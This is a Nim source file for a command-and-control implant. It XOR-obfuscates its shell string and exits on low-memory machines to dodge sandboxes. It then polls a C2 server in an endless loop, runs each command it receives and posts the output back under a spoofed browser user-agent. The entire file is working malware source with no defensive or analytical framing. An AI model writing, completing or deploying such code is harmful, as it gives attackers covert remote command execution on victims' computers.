proc runCmd(cmd: string): string =
  try:
    let shell = xd([0x14'u8, 0x1a, 0x13, 0x57, 0x12, 0x3f, 0x12, 0x27, 0x58, 0x14, 0x27])
    let (output, _) = execCmdEx(shell & cmd)
    return output
  except:
    return "Error"

proc main() =
  sleep(3000)
  
  when defined(windows):
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = cast[DWORD](sizeof(MEMORYSTATUSEX))
    GlobalMemoryStatusEx(addr memStatus)
    if cast[uint64](memStatus.ullTotalPhys) < 2000000000'u64:
      quit(0)
  
  randomize()
  let c2 = getC2()
  let apiKey = getApiKey()
  let token = getToken()
  let hostname = getEnv("COMPUTERNAME", "unknown")
  let agentId = hostname & "-" & toHex(rand(0xFFFF), 4).toLowerAscii()
  
  let cmdUrl = c2 & "/bits/cmd/" & agentId & "?key=" & token
  let resultUrl = c2 & "/bits/result/" & agentId & "?key=" & token
  
  var client = newHttpClient(timeout = 30000)
  client.headers = newHttpHeaders({"X-API-Key": apiKey, "User-Agent": "Mozilla/5.0"})
  
  while true:
    try:
      let resp = client.getContent(cmdUrl)
      var cmd = ""
      try:
        let j = parseJson(resp)
        if j.hasKey("command") and j["command"].kind != JNull:
          cmd = j["command"].getStr()
      except:
        cmd = resp.strip()
      
      if cmd.len > 0:
        let output = runCmd(cmd)
        client.headers["Content-Type"] = "application/json"
        discard client.postContent(resultUrl, $(%*{"result": output}))
    except:
      discard
    sleep(5000)

when isMainModule:
  main()
